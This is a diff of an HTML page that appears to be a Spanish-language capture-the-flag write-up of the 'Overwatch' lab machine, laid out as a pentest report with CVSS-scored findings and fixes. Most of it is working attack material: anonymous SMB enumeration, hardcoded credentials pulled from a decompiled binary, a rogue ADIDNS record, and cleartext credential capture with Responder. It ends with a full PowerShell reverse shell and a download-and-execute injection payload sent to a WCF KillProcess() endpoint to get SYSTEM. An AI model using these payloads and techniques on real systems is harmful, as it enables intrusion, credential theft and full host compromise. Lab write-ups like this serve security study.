-    <div class="step-title">Captura de credenciales MSSQL en claro con Responder</div>
-    <p class="step-desc">Con SQL07 resolviendo a la IP del atacante, se lanzó <strong>Responder</strong> en la interfaz tun0. Al disparar la consulta del servidor enlazado, SQL Server realizó una conexión saliente enviando las credenciales de <strong>sqlmgmt</strong> en texto claro. Con estas credenciales se obtuvo una shell WinRM y la user flag.</p>
-    <pre><span class="cmd-tool">sudo responder</span> <span class="cmd-flag">-I</span> tun0 <span class="cmd-flag">-w -d</span>
-```
+      <div class="attack-step">
+        <div class="step-num">Fase 02 · SMB Enumeration</div>
+        <div class="step-title">Null session y acceso al share software$</div>
+        <p class="step-desc">Con SMB abierto, el primer intento siempre es enumerar shares con sesión nula (sin credenciales). En entornos modernos esto suele fallar, pero vale la pena el intento — y en este caso da resultado.</p>
 
-[MSSQL] Cleartext Client  : 10.129.244.81
-[MSSQL] Cleartext Hostname: SQL07
-[MSSQL] Cleartext Username: <span class="cmd-value">sqlmgmt</span>
-[MSSQL] Cleartext Password: <span class="cmd-value">bIhBbzMMnB82yx</span>
+        <pre><span class="cmd-comment"># Listar shares con sesión nula</span>
+<span class="cmd-tool">smbclient</span> <span class="cmd-flag">-L</span> \\\\10.129.244.81 <span class="cmd-flag">-U</span> ''
 
-<span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> 10.129.244.81 <span class="cmd-flag">-u</span> sqlmgmt <span class="cmd-flag">-p</span> bIhBbzMMnB82yx
-*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> cat user.txt
+Password for [WORKGROUP\]: <span class="cmd-comment">← enter vacío</span>
+
+  Sharename       Type      Comment
+  ---------       ----      -------
+  <span class="cmd-value">software$</span>       Disk
+  SYSVOL          Disk      Logon server share
+  NETLOGON        Disk      Logon server share
+  IPC$            IPC       Remote IPC</pre>
+
+        <p class="step-desc">Hay un share no estándar: <code>software$</code>. El signo de dólar al final no lo convierte en oculto (eso es solo en Windows explorer), pero sí indica que no es un share por defecto del sistema — alguien lo creó manualmente. Lo intento acceder sin credenciales:</p>
+
+        <pre><span class="cmd-tool">smbclient</span> \\\\10.129.244.81\\software$ <span class="cmd-flag">-U</span> ''
+
+smb: \> ls
+  .           D         0
+  ..          D         0
+  <span class="cmd-value">Monitoring</span>  D         0
+
+smb: \> cd Monitoring\
+smb: \Monitoring\> ls
+  overwatch.exe          AH   9728
+  overwatch.exe.config   AH   2163
+  overwatch.pdb          AH  30208
+  EntityFramework.dll    AH  ...
+  System.Data.SQLite.dll AH  ...
+  System.Management.Automation.dll AH  ...</pre>
+
+        <p class="step-desc">Acceso completo sin autenticación. El directorio <code>Monitoring/</code> contiene lo que parece una aplicación de monitorización .NET completa: el ejecutable, la base de datos de símbolos PDB (que facilita enormemente el debugging y la ingeniería inversa), y varias DLLs de dependencia. Lo monto localmente para trabajar con comodidad:</p>
+
+        <pre><span class="cmd-comment"># Montar el share para acceso directo</span>
+mkdir <span class="cmd-flag">-p</span> /tmp/overwatch/monitoring
+<span class="cmd-tool">mount</span> <span class="cmd-flag">-t cifs</span> //10.129.244.81/software$ /tmp/overwatch/monitoring \
+      <span class="cmd-flag">-o</span> username=guest,password=''
+
+<span class="cmd-comment"># O simplemente descargar todo</span>
+<span class="cmd-tool">smbclient</span> \\\\10.129.244.81\\software$ <span class="cmd-flag">-U</span> '' \
+          <span class="cmd-flag">-c</span> 'recurse ON; prompt OFF; mget *'</pre>
+
+        <div class="callout callout-warn">
+          <strong>F-01 · High · CWE-284</strong><br>
+          El share <code>software$</code> es accesible por cualquier usuario no autenticado. Exponer el binario compilado de una aplicación interna junto con sus símbolos de debug (.pdb) es equivalente a entregar el código fuente. Este único fallo habilita toda la cadena de ataque posterior.
+        </div>
+      </div>
+    </section>
+
+    <!-- DNSPY -->
+    <section class="section" id="dnspy">
+      <div class="section-label">03 — Reverse Engineering</div>
+      <h2>dnSpy — Análisis del Binario .NET</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 03 · .NET Decompilation</div>
+        <div class="step-title">Descompilación con dnSpy y extracción de secrets</div>
+        <p class="step-desc">Los binarios .NET son especialmente "reversibles" porque el bytecode CIL (Common Intermediate Language) retiene nombres de clases, métodos y variables, lo que permite a dnSpy reconstruir código C# prácticamente idéntico al original. Con el archivo <code>.pdb</code> presente, la experiencia es aún mejor — tenemos información de debug completa.</p>
+        <p class="step-desc">Abro <code>overwatch.exe</code> en dnSpy y navego por el árbol de assemblies. La estructura de clases es inmediatamente visible en el panel izquierdo: hay un <code>Program</code>, un <code>IMonitoringService</code> y un <code>MonitoringService</code>. Me centro en esta última.</p>
+
+        <div class="step-h3">CheckEdgeHistory() — Credenciales hardcodeadas</div>
+        <p class="step-desc">El primer hallazgo está en el método <code>CheckEdgeHistory()</code>. Este método parece leer el historial de navegación de Microsoft Edge (SQLite) y volcarlo en una base de datos SQL Server para logging de seguridad. El problema es obvio en la línea 14:</p>
+
+        <pre><span class="cmd-comment">// Método CheckEdgeHistory — clase MonitoringService</span>
+<span class="cmd-comment">// Token: 0x0600000D  RVA: 0x00002370</span>
+private static void CheckEdgeHistory(object sender, ElapsedEventArgs e)
+{
+  string text = Path.Combine(
+    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+    <span class="cmd-value">"Microsoft\\Edge\\User Data\\Default\\History"</span>);
+
+  if (!File.Exists(text)) return;
+
+  string tempFileName = Path.GetTempFileName();
+  File.Copy(text, tempFileName, true);
+
+  try {
+    <span class="cmd-comment">// ← AQUÍ: cadena de conexión con credenciales en texto claro</span>
+    using (SqlConnection sqlConnection = new SqlConnection(
+      <span class="cmd-value">"Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"</span>))
+    {
+      sqlConnection.Open();
+      using (SqlCommand sqlCommand = new SqlCommand())
+      {
+        sqlCommand.Connection = sqlConnection;
+        SQLiteConnection sqliteConnection = new SQLiteConnection(
+          "Data Source=" + tempFileName + ";Version=3;");
+        sqliteConnection.Open();
+        SQLiteDataReader sqliteDataReader = new SQLiteCommand(
+          "SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5",
+          sqliteConnection).ExecuteReader();
+        while (sqliteDataReader.Read())
+        {
+          string str = sqliteDataReader["url"].ToString();
+          string commandText = "INSERT INTO EventLog (Timestamp, EventType, Details) " +
+                               "VALUES (GETDATE(), 'URLVisit', '" + str + "')";
+          sqlCommand.CommandText = commandText;
+          sqlCommand.ExecuteNonQuery();
+        }
+        sqliteConnection.Close();
+      }
+    }
+  }
+  catch { }
+  finally { File.Delete(tempFileName); }
+}</pre>
+
+        <p class="step-desc">Credenciales de SQL Server hardcodeadas directamente en el código: <code>sqlsvc : TI0LKcfHzZw1Vv</code>. Cualquier persona que pueda leer el binario — lo cual en este caso incluye a cualquier usuario no autenticado — obtiene credenciales de dominio válidas.</p>
+
+        <div class="step-h3">KillProcess() — Vector de inyección de comandos</div>
+        <p class="step-desc">El segundo hallazgo es aún más crítico. El método <code>KillProcess()</code> recibe un nombre de proceso del caller y ejecuta <code>Stop-Process</code> de PowerShell. El problema: concatena el parámetro directamente en la cadena de comandos sin ningún tipo de validación o sanitización:</p>
+
+        <pre><span class="cmd-comment">// Método KillProcess — clase MonitoringService</span>
+public string KillProcess(string processName)
+{
+  <span class="cmd-comment">// ← El parámetro processName se inyecta directamente en el script PowerShell</span>
+  string scriptContents = <span class="cmd-value">"Stop-Process -Name " + processName + " -Force"</span>;
+  string result;
+  try {
+    using (Runspace runspace = RunspaceFactory.CreateRunspace())
+    {
+      runspace.Open();
+      using (Pipeline pipeline = runspace.CreatePipeline())
+      {
+        pipeline.Commands.AddScript(scriptContents);
+        pipeline.Commands.Add("Out-String");
+        Collection&lt;PSObject&gt; collection = pipeline.Invoke();
+        runspace.Close();
+        StringBuilder stringBuilder = new StringBuilder();
+        foreach (PSObject psobject in collection)
+          stringBuilder.AppendLine(psobject.ToString());
+        result = stringBuilder.ToString();
+      }
+    }
+  }
+  catch (Exception ex) { result = "Error: " + ex.Message; }
+  return result;
+}</pre>
+
+        <p class="step-desc">Si envío <code>"notepad; whoami"</code> como <code>processName</code>, el script que se ejecuta es <code>Stop-Process -Name notepad; whoami -Force</code>. El punto y coma actúa como separador de comandos en PowerShell, lo que significa ejecución arbitraria de código. Anoto esto para la fase de escalada — todavía no tengo acceso al servicio WCF, pero sé exactamente cómo abusarlo cuando llegue el momento.</p>
+
+        <div class="callout callout-warn">
+          <strong>F-02 · High · CWE-798 — F-05 · Critical · CWE-78</strong><br>
+          <code>CheckEdgeHistory()</code> expone credenciales hardcodeadas (CVSS 8.8). <code>KillProcess()</code> permite command injection sin autenticación a cualquier usuario que pueda contactar el endpoint WCF (CVSS 9.8). Ambos en el mismo binario accesible anónimamente.
+        </div>
+      </div>
+    </section>
+
+    <!-- MSSQL -->
+    <section class="section" id="mssql">
+      <div class="section-label">04 — Credential Use</div>
+      <h2>MSSQL — Enumeración con las credenciales extraídas</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 04 · MSSQL Access</div>
+        <div class="step-title">Autenticación y enumeración de Linked Servers</div>
+        <p class="step-desc">Con las credenciales <code>sqlsvc:TI0LKcfHzZw1Vv</code> me autentico contra el servicio MSSQL en el puerto 6520. Uso <code>mssqlclient.py</code> de Impacket con autenticación Windows (-windows-auth) porque la cuenta es una cuenta de dominio.</p>
+
+        <pre><span class="cmd-tool">mssqlclient.py</span> overwatch.htb/sqlsvc:<span class="cmd-value">TI0LKcfHzZw1Vv</span>@10.129.244.81 \
+               <span class="cmd-flag">-p</span> 6520 <span class="cmd-flag">-windows-auth</span>
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 10000)
+[!] Press help for extra shell commands
+
+SQL (overwatch\sqlsvc  dbo@master)></pre>
+
+        <p class="step-desc">Sesión activa. El primer comando interesante en MSSQL cuando se busca movimiento lateral es <code>sp_linkedservers</code> — muestra las conexiones configuradas a otros servidores SQL:</p>
+
+        <pre>SQL> EXEC sp_linkedservers;
+
+SRV_NAME              SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE
+--------------------  -----------------  ------------  ----------------
+S200401\SQLEXPRESS    SQLNCLI            SQL Server    S200401\SQLEXPRESS
+<span class="cmd-value">SQL07</span>                 SQLNCLI            SQL Server    SQL07</pre>
+
+        <p class="step-desc">Hay un servidor enlazado llamado <code>SQL07</code>. Los linked servers en SQL Server son conexiones preconfiguradas a otras instancias SQL, muy usados en entornos empresariales para consultas distribuidas. Cuando SQL Server intenta conectarse a un linked server, envía credenciales de autenticación al destino.</p>
+        <p class="step-desc">La clave aquí es: ¿existe <code>SQL07</code> en DNS? Hago la resolución:</p>
+
+        <pre><span class="cmd-comment"># Comprobar si SQL07 resuelve en DNS</span>
+<span class="cmd-tool">nslookup</span> SQL07 10.129.244.81
+Server:  10.129.244.81
+Address: 10.129.244.81#53
+
+<span class="cmd-value">** server can't find SQL07: NXDOMAIN</span></pre>
+
+        <p class="step-desc"><code>SQL07</code> no existe en DNS. Esto significa que cada vez que SQL Server intente conectarse a ese linked server, fallará la resolución — pero antes de fallar, intentará autenticarse. Si puedo crear ese registro DNS apuntando a mi máquina, capturaré esas credenciales.</p>
+
+        <div class="callout">
+          <strong>F-06 · Medium — Linked Server no resuelto</strong><br>
+          Un linked server apuntando a un nombre DNS inexistente es una señal de alarma desde el punto de vista de seguridad. Indica que el servidor destino puede haber sido dado de baja, pero la configuración no se ha limpiado. En este caso, ese "hueco" es exactamente lo que necesitamos para el ataque de DNS poisoning.
+        </div>
+      </div>
+    </section>
+
+    <!-- DNS POISONING -->
+    <section class="section" id="dns">
+      <div class="section-label">05 — DNS Poisoning</div>
+      <h2>BloodyAD — Inyección de registro DNS en Active Directory</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 05 · DNS Poisoning via ADIDNS</div>
+        <div class="step-title">Abuso de permisos WRITE en AD para crear un registro A falso</div>
+        <p class="step-desc">Active Directory Integrated DNS (ADIDNS) almacena los registros DNS directamente en objetos de AD. Por defecto, los usuarios autenticados tienen permiso para añadir nuevos registros DNS bajo la zona del dominio — esto es por diseño, para facilitar el registro dinámico de equipos. La herramienta <strong>BloodyAD</strong> permite auditar y abusar de permisos AD sin necesitar privilegios elevados.</p>
+        <p class="step-desc">Primero verifico qué permisos de escritura tiene la cuenta <code>sqlsvc</code> en AD:</p>
+
+        <pre><span class="cmd-tool">bloodyAD</span> <span class="cmd-flag">-d</span> S200401.overwatch.htb <span class="cmd-flag">-u</span> sqlsvc <span class="cmd-flag">-p</span> TI0LKcfHzZw1Vv \
+         <span class="cmd-flag">--dc-ip</span> 10.129.244.81 get writable
+
+distinguishedName: CN=sqlsvc,CN=Users,DC=overwatch,DC=htb
+  attribute: member  permission: <span class="cmd-value">WRITE</span>
+
+distinguishedName: DC=overwatch,DC=htb
+  attribute: dnsNode  permission: <span class="cmd-value">WRITE</span></pre>
+
+        <p class="step-desc">Confirmado: <code>sqlsvc</code> tiene permisos <code>WRITE</code> sobre nodos DNS del dominio. Esto significa que puede crear nuevos registros A. Inyecto un registro que apunta <code>SQL07</code> a mi IP de atacante (la interfaz <code>tun0</code> de la VPN HTB):</p>
+
+        <pre><span class="cmd-comment"># Añadir registro A: SQL07 → 10.10.15.115 (mi tun0)</span>
+<span class="cmd-tool">bloodyAD</span> <span class="cmd-flag">-d</span> overwatch.htb <span class="cmd-flag">-u</span> sqlsvc <span class="cmd-flag">-p</span> TI0LKcfHzZw1Vv \
+         <span class="cmd-flag">--dc-ip</span> 10.129.244.81 add dnsRecord SQL07 10.10.15.115
+
+[+] SQL07 has been successfully added
+
+<span class="cmd-comment"># Verificar que el registro existe ahora</span>
+<span class="cmd-tool">nslookup</span> SQL07 10.129.244.81
+Server:  10.129.244.81
+Address: 10.129.244.81#53
+
+Name:    SQL07.overwatch.htb
+Address: <span class="cmd-value">10.10.15.115</span></pre>
+
+        <p class="step-desc">El registro DNS está creado. Ahora cuando SQL Server en <code>S200401</code> intente conectarse al linked server <code>SQL07</code>, resolverá a mi IP. La siguiente pregunta es: ¿cómo se autentica SQL Server a un linked server? Aquí es donde entra Responder.</p>
+
+        <div class="callout callout-warn">
+          <strong>F-03 · High · CWE-269 — DNS WRITE via sqlsvc</strong><br>
+          Una cuenta de servicio SQL no debería tener permisos de escritura sobre la zona DNS de AD. Este tipo de permiso es un vector clásico para ataques MitM y credential capture. La segmentación por niveles de AD (Tier Model) existe precisamente para evitar que cuentas de servicio de aplicación tengan acceso a objetos de infraestructura como DNS.
+        </div>
+      </div>
+    </section>
+
+    <!-- RESPONDER -->
+    <section class="section" id="responder">
+      <div class="section-label">06 — Credential Capture</div>
+      <h2>Responder — Captura de credenciales MSSQL en texto claro</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 06 · Cleartext Credential Capture</div>
+        <div class="step-title">Interceptar la autenticación del Linked Server SQL07</div>
+        <p class="step-desc">Responder es una herramienta que actúa como servidor falso para múltiples protocolos (SMB, HTTP, MSSQL, FTP, LDAP...) y captura los intentos de autenticación dirigidos hacia él. Normalmente captura hashes NTLMv2, pero en este caso esperamos credenciales en texto claro porque los linked servers MSSQL pueden estar configurados para autenticación SQL (no integrada), que transmite usuario y contraseña sin cifrar.</p>
+        <p class="step-desc">Levanto Responder en la interfaz <code>tun0</code> y luego provoco que SQL Server intente conectarse al linked server:</p>
+
+        <pre><span class="cmd-comment"># Terminal 1: Responder escuchando en tun0</span>
+<span class="cmd-tool">sudo responder</span> <span class="cmd-flag">-I</span> tun0 <span class="cmd-flag">-w -d</span>
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+[+] Listening for events...
+
+<span class="cmd-comment"># Terminal 2: Desde mssqlclient, trigger del linked server</span>
+SQL> EXEC ('select 1') AT [SQL07];</pre>
+
+        <pre><span class="cmd-comment"># Responder captura la conexión entrante</span>
+[MSSQL] Cleartext Client   : 10.129.244.81
+[MSSQL] Cleartext Hostname : SQL07 ()
+[MSSQL] Cleartext Username : <span class="cmd-value">sqlmgmt</span>
+[MSSQL] Cleartext Password : <span class="cmd-value">bIhBbzMMnB82yx</span></pre>
+
+        <p class="step-desc">Las credenciales de <code>sqlmgmt</code> capturadas en texto claro. El linked server estaba configurado con autenticación SQL estándar (usuario/contraseña), no con autenticación Windows/Kerberos. Cuando SQL Server intentó conectarse a "SQL07" — que ahora apunta a mi máquina — Responder actuó como servidor MSSQL y recibió las credenciales sin cifrar.</p>
+
+        <div class="callout callout-warn">
+          <strong>F-04 · High · CWE-312 — MSSQL cleartext auth</strong><br>
+          Los linked servers deberían usar autenticación Kerberos (Windows Integrated) o al menos TLS para la transmisión de credenciales. La autenticación SQL estándar transmite usuario y contraseña en claro sobre el wire — una vez que el DNS está envenenado, la captura es trivial.
+        </div>
+      </div>
+    </section>
+
+    <!-- WINRM -->
+    <section class="section" id="winrm">
+      <div class="section-label">07 — Initial Access</div>
+      <h2>WinRM — Acceso inicial y enumeración post-explotación</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 07 · WinRM Shell</div>
+        <div class="step-title">Shell con Evil-WinRM → user.txt → Enumeración del sistema</div>
+        <p class="step-desc">WinRM (puerto 5985) estaba abierto desde el escaneo inicial. Pruebo las credenciales capturadas:</p>
+
+        <pre><span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> 10.129.244.81 <span class="cmd-flag">-u</span> sqlmgmt <span class="cmd-flag">-p</span> <span class="cmd-value">bIhBbzMMnB82yx</span>
+
+Evil-WinRM shell v3.9
+Info: Establishing connection to remote endpoint
+
+<span class="cmd-comment"># User flag</span>
+*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> type user.txt
 <span class="cmd-value">62a1f3fb06c2c857cf2fefabcada7c40</span></pre>
-</div>
 
-```
-  <div class="attack-step">
-    <div class="step-num">Fase 05 · Privilege Escalation</div>
-    <div class="step-title">Inyección de Comandos en WCF KillProcess() → SYSTEM</div>
-    <p class="step-desc">La enumeración post-acceso confirmó que <strong>overwatch.exe</strong> se ejecutaba como <code>NT AUTHORITY\SYSTEM</code> (PID 4700) exponiendo un servicio WCF SOAP en el puerto 8000. El método <code>KillProcess()</code> concatenaba el parámetro <code>processName</code> directamente en PowerShell sin sanitizar. Se inyectó un payload de reverse shell mediante <code>New-WebServiceProxy</code>.</p>
-    <pre><span class="cmd-comment"># Attacker — servidor HTTP y listener</span>
-```
+        <p class="step-desc">Shell activa. Antes de ir directamente a la escalada, enumero el sistema para entender en qué contexto estoy y qué hay en ejecución:</p>
 
-python3 <span class="cmd-flag">-m</span> http.server 80
-nc <span class="cmd-flag">-nlvp</span> 443
+        <pre><span class="cmd-comment"># Quién soy y qué privilegios tengo</span>
+*Evil-WinRM* PS> whoami /all
+User Name        : overwatch\sqlmgmt
+...
+Privileges:
+  SeChangeNotifyPrivilege      Enabled
+  SeIncreaseWorkingSetPrivilege Enabled
 
-<span class="cmd-comment"># Desde la shell WinRM de sqlmgmt</span>
-$wsdl = “http://overwatch.htb:8000/MonitorService?singleWsdl”
-$proxy = New-WebServiceProxy <span class="cmd-flag">-Uri</span> $wsdl <span class="cmd-flag">-Namespace</span> Monitoring
-$proxy.KillProcess(<span class="cmd-value">“dummy; iex (New-Object Net.WebClient).DownloadString(‘http://10.10.15.115/shell.ps1’) #”</span>)
+<span class="cmd-comment"># Qué procesos están corriendo en el sistema</span>
+*Evil-WinRM* PS> Get-Process | Select-Object Name, Id, Path | ft -Auto
 
-<span class="cmd-comment"># Shell recibida en el atacante</span>
+Name             Id    Path
+----             --    ----
+...
+<span class="cmd-value">overwatch       4700   C:\Program Files\Monitoring\overwatch.exe</span>
+...
+
+<span class="cmd-comment"># Conexiones de red activas</span>
+*Evil-WinRM* PS> netstat -ano | findstr LISTENING
+
+  TCP   0.0.0.0:5985    LISTENING   4
+  TCP   0.0.0.0:6520    LISTENING   ...
+  TCP   0.0.0.0:<span class="cmd-value">8000</span>    LISTENING   <span class="cmd-value">4700</span>   <span class="cmd-comment">← overwatch.exe escucha en 8000</span></pre>
+
+        <p class="step-desc"><code>overwatch.exe</code> está corriendo con PID 4700 y escucha en el puerto 8000. Verifico bajo qué usuario se ejecuta ese proceso:</p>
+
+        <pre>*Evil-WinRM* PS> Get-WmiObject Win32_Process -Filter "ProcessId=4700" |
+  Select-Object Name, ProcessId, @{N='Owner';E={$_.GetOwner().User}}
+
+Name           ProcessId  Owner
+----           ---------  -----
+<span class="cmd-value">overwatch.exe  4700       SYSTEM</span></pre>
+
+        <p class="step-desc"><code>overwatch.exe</code> corre como <strong>SYSTEM</strong>. Y ese proceso expone el servicio WCF con el método <code>KillProcess()</code> vulnerable que identifiqué durante el análisis con dnSpy. La escalada está servida.</p>
+      </div>
+    </section>
+
+    <!-- WCF DISCOVERY -->
+    <section class="section" id="wcf">
+      <div class="section-label">08 — Service Discovery</div>
+      <h2>WCF — Descubrimiento y análisis del endpoint SOAP</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 08 · WCF Service Analysis</div>
+        <div class="step-title">Navegación al WSDL y comprensión de la interfaz del servicio</div>
+        <p class="step-desc">WCF (Windows Communication Foundation) es el framework de Microsoft para crear servicios web. El endpoint en el puerto 8000 publica un servicio SOAP. Lo primero es obtener el WSDL (Web Services Description Language) — el "contrato" que define los métodos disponibles y sus parámetros:</p>
+
+        <pre><span class="cmd-comment"># Obtener el WSDL del servicio WCF</span>
+*Evil-WinRM* PS> Invoke-WebRequest "http://overwatch.htb:8000/MonitorService?singleWsdl" |
+  Select-Object -ExpandProperty Content | Out-String
+
+<span class="cmd-comment"># Output relevante del WSDL</span>
+&lt;wsdl:portType name="IMonitoringService"&gt;
+  &lt;wsdl:operation name="<span class="cmd-value">KillProcess</span>"&gt;
+    &lt;wsdl:input message="tns:IMonitoringService_KillProcess_InputMessage"/&gt;
+    &lt;wsdl:output message="tns:IMonitoringService_KillProcess_OutputMessage"/&gt;
+  &lt;/wsdl:operation&gt;
+  &lt;wsdl:operation name="<span class="cmd-value">LogEvent</span>"&gt;...&lt;/wsdl:operation&gt;
+  &lt;wsdl:operation name="<span class="cmd-value">StartMonitoring</span>"&gt;...&lt;/wsdl:operation&gt;
+  &lt;wsdl:operation name="<span class="cmd-value">StopMonitoring</span>"&gt;...&lt;/wsdl:operation&gt;
+&lt;/wsdl:portType&gt;</pre>
+
+        <p class="step-desc">El WSDL confirma la existencia de <code>KillProcess</code> y los demás métodos que ya conocía del análisis dnSpy. PowerShell tiene un cmdlet nativo para crear un proxy de servicio web que genera automáticamente las clases necesarias para llamar a los métodos del WSDL: <code>New-WebServiceProxy</code>.</p>
+      </div>
+    </section>
+
+    <!-- PRIVESC -->
+    <section class="section" id="privesc">
+      <div class="section-label">09 — Privilege Escalation</div>
+      <h2>WCF Command Injection → NT AUTHORITY\SYSTEM</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 09 · PrivEsc via WCF KillProcess()</div>
+        <div class="step-title">Inyección de reverse shell en el parámetro processName</div>
+        <p class="step-desc">El exploit es directo: <code>KillProcess()</code> construye el comando PowerShell como <code>"Stop-Process -Name " + processName + " -Force"</code>. Si inyecto un punto y coma en <code>processName</code>, puedo añadir comandos adicionales que se ejecutarán en el contexto de SYSTEM.</p>
+        <p class="step-desc">Preparo el payload. Uso un script PowerShell de reverse shell clásico, lo sirvo desde un servidor HTTP python en mi máquina, y lo ejecuto mediante download-and-execute:</p>
+
+        <pre><span class="cmd-comment"># En mi máquina atacante — generar shell.ps1 (PowerShell reverse shell)</span>
+<span class="cmd-tool">cat</span> shell.ps1
+$client = New-Object System.Net.Sockets.TCPClient('10.10.15.115', 443)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
+  $sendback = (iex $data 2>&1 | Out-String)
+  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+  $stream.Write($sendbyte,0,$sendbyte.Length)
+  $stream.Flush()
+}
+$client.Close()
+
+<span class="cmd-comment"># Terminal 1: Servidor HTTP para servir shell.ps1</span>
+<span class="cmd-tool">python3</span> <span class="cmd-flag">-m</span> http.server 80
+
+<span class="cmd-comment"># Terminal 2: Listener de reverse shell</span>
+<span class="cmd-tool">nc</span> <span class="cmd-flag">-nlvp</span> 443</pre>
+
+        <pre><span class="cmd-comment"># Desde la shell WinRM como sqlmgmt — construir el proxy y lanzar el payload</span>
+*Evil-WinRM* PS> $wsdl = "http://overwatch.htb:8000/MonitorService?singleWsdl"
+*Evil-WinRM* PS> $proxy = New-WebServiceProxy <span class="cmd-flag">-Uri</span> $wsdl <span class="cmd-flag">-Namespace</span> Monitoring
+
+<span class="cmd-comment"># Payload: "dummy" termina el proceso (aunque falle) y el punto y coma inicia el siguiente comando</span>
+*Evil-WinRM* PS> $payload = <span class="cmd-value">"dummy; iex (New-Object Net.WebClient).DownloadString('http://10.10.15.115/shell.ps1') #"</span>
+*Evil-WinRM* PS> $proxy.KillProcess($payload)</pre>
+
+        <pre><span class="cmd-comment"># Respuesta en el listener nc</span>
+Listening on 0.0.0.0 443
 connect to [10.10.15.115] from (UNKNOWN) [10.129.244.81] 59275
-whoami
+
+PS C:\Windows\system32> whoami
 <span class="cmd-value">nt authority\system</span>
+
+PS C:\Windows\system32> hostname
+S200401
 
 PS C:\Users\Administrator\Desktop> type root.txt
 <span class="cmd-value">9a6ea3cdd5e3235b48224790b62790c2</span></pre>
-</div>
 
-```
-</section>
+        <p class="step-desc">Shell como SYSTEM. El payload funciona exactamente como se analizó: PowerShell interpreta el punto y coma como separador de comandos, ejecuta <code>Stop-Process -Name dummy</code> (que falla silenciosamente porque "dummy" no es un proceso válido), y luego ejecuta el downloader que descarga y ejecuta <code>shell.ps1</code> desde mi servidor HTTP. El <code>#</code> al final comenta el resto del string (<code>-Force</code>) para evitar errores de sintaxis.</p>
 
-<!-- FINDINGS -->
-<section class="section" id="findings">
-  <div class="section-label">04 — Findings</div>
-  <h2>Hallazgos Técnicos</h2>
-  <table class="findings-table">
-    <thead>
-      <tr>
-        <th>#</th>
-        <th>Severidad</th>
-        <th>Hallazgo</th>
-        <th>CVSS 3.1</th>
-        <th>CWE</th>
-      </tr>
-    </thead>
-    <tbody>
-      <tr>
-        <td>F-01</td>
-        <td><span class="severity sev-high">High</span></td>
-        <td>Lectura SMB anónima en el recurso software$</td>
-        <td>7.5</td>
-        <td>CWE-284</td>
-      </tr>
-      <tr>
-        <td>F-02</td>
-        <td><span class="severity sev-high">High</span></td>
-        <td>Credenciales en código fuente del servicio overwatch.exe</td>
-        <td>8.8</td>
-        <td>CWE-798</td>
-      </tr>
-      <tr>
-        <td>F-03</td>
-        <td><span class="severity sev-high">High</span></td>
-        <td>Envenenamiento DNS vía BloodyAD (permisos WRITE de sqlsvc)</td>
-        <td>8.1</td>
-        <td>CWE-269</td>
-      </tr>
-      <tr>
-        <td>F-04</td>
-        <td><span class="severity sev-high">High</span></td>
-        <td>Captura de credenciales MSSQL en claro mediante Responder</td>
-        <td>8.8</td>
-        <td>CWE-312</td>
-      </tr>
-      <tr>
-        <td>F-05</td>
-        <td><span class="severity sev-critical">Critical</span></td>
-        <td>Inyección de comandos en el endpoint WCF KillProcess()</td>
-        <td>9.8</td>
-        <td>CWE-78</td>
-      </tr>
-      <tr>
-        <td>F-06</td>
-        <td><span class="severity sev-medium">Medium</span></td>
-        <td>Enumeración de servidor enlazado MSSQL (SQL07)</td>
-        <td>—</td>
-        <td>—</td>
-      </tr>
-      <tr>
-        <td>F-07</td>
-        <td><span class="severity sev-info">Info</span></td>
-        <td>Sin actividad de detección/respuesta observada</td>
-        <td>—</td>
-        <td>—</td>
-      </tr>
-    </tbody>
-  </table>
-</section>
+        <div class="callout callout-warn">
+          <strong>F-05 · Critical · CWE-78 — CVSS 9.8</strong><br>
+          OS Command Injection sin restricción de red ni autenticación, ejecutado en el contexto de SYSTEM. El fix es trivial: reemplazar la concatenación de strings por <code>System.Diagnostics.Process.Kill()</code> con un argumento validado por whitelist. Ningún servicio de monitorización debería ejecutarse como SYSTEM.
+        </div>
+      </div>
+    </section>
 
-<!-- CREDENCIALES -->
-<section class="section" id="creds">
-  <div class="section-label">05 — Credentials</div>
-  <h2>Credenciales Obtenidas</h2>
-  <div class="creds-box">
-    <span class="cred-label"># sqlsvc — Hardcodeada en binario overwatch.exe</span><br>
-    <span class="cred-user">sqlsvc</span> : <span class="cred-pass">TI0LKcfHzZw1Vv</span><br><br>
-    <span class="cred-label"># sqlmgmt — Texto claro capturado con Responder (MSSQL linked server)</span><br>
-    <span class="cred-user">sqlmgmt</span> : <span class="cred-pass">bIhBbzMMnB82yx</span>
-  </div>
-  <p>Con las credenciales de sqlmgmt se obtuvo acceso WinRM y la user flag. Con la inyección WCF se obtuvo shell SYSTEM y la root flag.</p>
-  <div class="creds-box">
-    <span class="cred-label"># Flags</span><br>
-    user.txt → <span class="cred-pass">62a1f3fb06c2c857cf2fefabcada7c40</span><br>
